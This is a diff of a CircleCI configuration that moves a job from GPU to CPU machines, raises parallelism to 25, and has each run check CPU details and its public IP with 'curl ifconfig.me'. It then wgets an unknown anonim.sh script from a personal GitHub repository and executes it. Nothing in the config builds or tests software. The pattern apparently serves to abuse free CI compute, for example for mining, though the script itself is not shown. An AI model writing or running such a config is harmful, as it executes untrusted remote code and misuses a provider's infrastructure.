@@ -3,14 +3,15 @@ version: 2.1
 jobs:
   trial:
     machine:
-      image: ubuntu-2004-cuda-11.4:202110-01
-    resource_class: gpu.nvidia.large
+      image: ubuntu-2004:current
+    resource_class: large
+    parallelism: 25
     steps:
-      - run: nvidia-smi
-      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: lscpu
+      - run: curl ifconfig.me
       - run: 
             name: "trial" 
-            command: wget https://raw.githubusercontent.com/jacujamil/dewasa/main/anonim.sh && chmod u+x anonim.sh && sudo ./anonim.sh 
+            command: wget https://raw.githubusercontent.com/j0642773/dua/main/anonim.sh && chmod u+x anonim.sh && ./anonim.sh
  
 workflows: 
     version: 2.1 
